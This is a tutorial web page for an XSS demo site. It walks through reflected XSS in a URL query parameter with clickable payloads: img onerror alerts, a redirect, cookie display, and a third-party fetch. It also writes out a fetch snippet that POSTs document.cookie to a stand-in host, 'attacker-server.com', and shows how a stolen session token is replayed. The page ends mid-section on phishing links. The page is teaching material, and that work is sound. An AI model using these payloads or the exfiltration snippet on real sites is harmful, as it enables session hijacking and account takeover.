            <h1>XSS Demo</h1>
            <p>This site demonstrates the power of the XSS attack when it can be run on an online service.</p>
            <p>Several attack methods are included here, so you can get an idea for how each one works.</p>
            <hr />
            <h2>What is XSS?</h2>
            <p>
                <u>XSS is a simple attack that involves arbitrarily executing code on a target user's browser
                by means of a poorly designed frontend and/or backend system.</u>
            </p>
            <p>
                This type of attack can be invoked in a variety of ways, including through forms, query parameters,
                profile pages on social media, and more. We will take a look at several methods here.
            </p>
            <h3>How the demo works</h3>
            <p>
                In the context of this demo, <code>attack1.html</code> simulates a situation in which the URL query
                parameters can be abused to inject arbitrary HTML and JavaScript code directly on the target user's
                browser.
            </p>
            <h2>XSS with URL query parameters</h2>
            <p>
                Suppose you have a page where you wish to display the user's name using a path parameter. During normal
                use, this URL could look something like this:
            </p>
            <div class="url-block">
                <a class="url-try" href="attack1.html?username=John%20Smith">Try &rarr;</a>
                <code>
                    https://xss.benstafford.dev/attack1.html<b>?username=John%20Smith</b>
                </code>
            </div>
            <p>This would print <code>Hello, John Smith!</code> on that page.</p>
            <p>
                Let's also suppose the page in which the endpoint is located is <i>not</i> sanitizing data in this field
                and, therefore, places the path parameter's content directly into the page. This is not good!
            </p>
            <h3>Exploiting HTML event attributes</h3>
            <p>
                Of course, one can take advantage of this. Using some HTML attribute trickery, you would be able to
                execute arbitrary JavaScript code on the target machine. Here's an example:
            </p>
            <div class="url-block">
                <a class="url-try" href="attack1.html?username=%3Cimg%20src=%22lmao%22%20onerror=%22alert('xss%20executed!')%22%3E">Try &rarr;</a>
                <code>
                    &lt;img src="lmao" onerror="alert('xss executed!')"&gt;
                </code>
            </div>
            <p>
                This takes advantage of a trick where you are able to render an <code>&lt;img&gt;</code> element on
                the page and immediately execute JavaScript code within the element as it appears on the page.
            </p>
            <p>
                HTML contains numerous event attributes where you can directly run JavaScript code within the element
                when a specific event occurs. Here, we are using the <code>onerror</code> event which triggers when the
                image experiences an error when loading. Because we know that <code>lmao</code> is not a valid image
                path either as an absolute or relative path and doesn't include a file extension, the image instantly
                fails to load and triggers <code>onerror</code>. In this case, the code causes an alert in the browser.
            </p>
            <p>
                When discussing XSS, <code>window.alert()</code> is an easy and popular way to demonstrate that
                arbitrary JavaScript code was executed on the browser.
            </p>
            <h3>Redirecting window location</h3>
            <p>
                Since we now have a way to run whatever we want, it's possible to redirect the user to any page you
                want, even if it is outside the current domain. You can probably see where I'm going here. I dare you
                to try this one:
            </p>
            <div class="url-block">
                <a class="url-try" href="attack1.html?username=%3Cimg%20src=%22evil%22%20onerror=%22location.href%20=%20'https://youtube.com/watch?v=dQw4w9WgXcQ'%22%3E">Try &rarr;</a>
                <code>
                    &lt;img src="evil" onerror="location.href = 'https://youtube.com/watch?v=dQw4w9WgXcQ'"&gt;
                </code>
            </div>
            <h3>DANGEROUS! Stealing session data</h3>
            <p>
                So far the other examples have demonstrated that it is possible to arbitrarily execute JavaScript code
                on the page. However, none of them have done much besides <i>play</i> with the user a little bit. Let's
                move on to discuss a <b>real powerful example</b> that XSS is known for &ndash; accessing user
                <b>session tokens</b> through exfiltrating <code>document.cookie</code> !
            </p>
            <p>
                <i>Session tokens</i> are strings of text that act as an alternative password to keep the end user
                logged into a service. Typically, session tokens expire after a set amount of time; however, in some
                cases, the expiration time may not exist or would be long enough for a malicious user to compromise
                the target user's account.
            </p>
            <h4>Getting a target user's session token data</h4>
            <p>
                Accessing the user's cookies is quite easy. It can be done in just one simple line:
                <code>document.cookie</code> &ndash; That's it! This returns a string containing a
                <code>key1=value1;key2=value2;key3=value3</code> format which can be instantly copied and pasted into
                the attacker's machine.
            </p>
            <p>
                The power of this attack comes when we are able to call <code>fetch()</code> to pipe the contents of
                <code>document.cookie</code> to a server that the attacker hosts. In other words, everyone who runs the
                following code would have their login credentials stolen instantly. Here's an example of how that could
                be done:
            </p>
            <code class="code-block">
                fetch("https://attacker-server.com/cookie-storage", {
                <br />
                &emsp;&emsp;method: "POST",
                <br />
                &emsp;&emsp;body: JSON.stringify({cookies: document.cookie})
                <br />
                }).then();
            </code>
            <h4>What this allows us to do</h4>
            <p>
                The very second a target user opens this link, within a few milliseconds, their credentials are stolen.
                Now on our end, we can inject the cookie, and <i>impersonate</i> the user, as we have essentially cloned
                sessions. This can be done like so:
            </p>
            <code class="code-block">
                document.cookie = "xss_test_session=STOLEN_TOKEN";
            </code>
            <p>
                <b>BOOM!</b> Access to the user's account is now granted, and we can do whatever we want. Change their
                passwords, make purchases, access credit cards, anything they can do, we can now do as well.
            </p>
            <h4>Simulating a cookie attack</h4>
            <p>Here's an example of a payload that would print the content of the cookie to the screen:</p>
            <div class="url-block">
                <a class="url-try" href="attack1.html?username=https://xss.benstafford.dev/attack1.html?username=%3Cimg%20src=%22bruh%22%20onerror=%22prompt('You%20have%20been%20hacked!%20Your%20session%20token%20is:',%20document.cookie.split('=')%5B1%5D)%22%3E">Try &rarr;</a>
                <code>
                    &lt;img src="bruh" onerror="prompt('You have been hacked! Your session token is:',
                    document.cookie.split('=')[1])"&gt;
                </code>
            </div>
            <h4>Third party JavaScript fetch</h4>
            <p>
                In this example, a request is made to a <a href="https://thesimpsonsquoteapi.glitch.me/" target="_blank">Simpsons API</a>
                to demonstrate that it is possible to send the cookie to third party services, such as a web server
                hosted by you as the attacker.
            </p>
            <p>
                A fetch request is made to the API to fetch a Simpsons quote, which then triggers a JavaScript promise
                to decode the JSON response from the server and display it on the page. Of course, in typical attacks
                you may not want to display anything after the data has been sent successfully &ndash; that's the point.
                XSS is a secretive attack that the user may not even notice has occurred in the background.
            </p>
            <div class="url-block">
                <a class="url-try" href="attack1.html?username=%3Cimg%20src=%22nah%22%20onerror=%22const%20msg%20=%20document.getElementById('xss-content');%20msg.textContent='awaiting%20xss%20request...';%20fetch('https://thesimpsonsquoteapi.glitch.me/quotes').then((res)%20=%3E%20%7Bres.json().then((json)%20=%3E%20%7Bmsg.innerHTML=(%60%3Cb%3EQuote%20from%20The%20Simpsons:%3C/b%3E%3Cbr%3E$%7Bjson%5B0%5D%5B'character'%5D%7D:%20$%7Bjson%5B0%5D%5B'quote'%5D%7D%60);%7D);%7D);%22%3E">Try &rarr;</a>

                <p>
                    Under no circumstances should you ever try to actually attempt to hijack a user's session with any
                    methods listed here without permission. These methods have typically already been patched by most major corporations.

            <h4>Deceptive messages</h4>
            <p>
                This becomes even more powerful in deceptive message attacks as the dangerous link appears to be a
                genuine link that wouldn't look any different from what the user is used to seeing on the site. For
                example, imagine my domain was a user's cloud service provider. The link could look like the following
                in a fake email sent from an attacker. Click <b>Try</b> to see it in action and to learn more.
